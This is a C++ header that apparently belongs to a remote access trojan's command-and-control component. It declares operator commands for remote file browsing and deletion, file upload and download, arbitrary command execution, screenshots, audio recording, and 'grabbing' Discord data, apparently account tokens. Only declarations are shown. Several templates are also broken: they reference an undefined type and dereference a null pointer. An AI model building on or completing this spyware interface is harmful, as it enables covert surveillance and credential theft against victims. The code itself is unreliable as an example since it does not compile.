#ifndef COMMANDS_H
#define COMMANDS_H

#include <string>
#include <memory>
#include <vector>
#include <iostream>
#include <typeinfo>
#include <typeindex>
#include <functional>
#include "controller.h"
#include "packet.h"

namespace c2 {
    template<class...> struct TypeEnumerator;
    template<class T, class... Args> struct TypeEnumerator<T, Args...> {
        static void build(std::vector<std::type_index>& list) {
            list.push_back(typeid(T));
            X<Args...>::build(list);
        }
    };
    template<> struct TypeEnumerator<> {
        static void build(std::vector<std::type_index>& list) {}
    };
}
template<class... Args> void build_typeinfos(std::vector<std::type_index>& list) {
    c2::TypeEnumerator<Args...>::build(list);
}

template<class... Args> void register_command(unsigned char type, std::unique_ptr<Packet>(*builder)(Args...)) {
    std::unique_ptr<std::vector<std::type_index>> argtypes;
    build_typeinfos<Args...>(*argtypes.get());
    Packet::register_packet_type(type, std::bind(CommandPacket::build, _1, std::move(argtypes)));
}

class CommandPacket {
public:
    static std::unique_ptr<Packet> build(unsigned char type, std::unique_ptr<std::vector<std::type_index>> argtypes, std::vector<char>& data);
};

enum class NavigateCommand {
    ls, cd, pwd, rm
};

enum class AudioCommand {
    start, stop, list
};

enum class DiscordCommand {
    check, grab
};

// navigation
int pwd(Controller* ctrl);
int changeDir(Controller* ctrl, const std::string path);
int listFiles(Controller* ctrl, const std::string path);
int removeFile(Controller* ctrl, const std::string path);

// files
int downloadFile(Controller* ctrl, const std::string path);
int uploadFile(Controller* ctrl, const std::string path, size_t size, const char* data);

// exec
int exec(Controller* ctrl, const std::string cmd, bool wait);

// screen
int screenshot(Controller* ctrl);

// audio
int audioCommand(Controller* ctrl, AudioCommand cmd);

// discord
int discordCommand(Controller* ctrl, DiscordCommand cmd);

#endif